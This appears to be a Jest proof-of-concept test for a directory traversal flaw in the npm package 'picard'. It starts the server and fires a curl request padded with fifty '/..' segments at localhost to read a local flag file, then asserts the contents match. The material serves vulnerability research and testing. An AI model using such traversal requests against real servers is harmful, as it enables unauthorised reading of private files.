//https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/picard
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in picard", (done) => {
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  const pkg = require("picard").start();

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9900${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
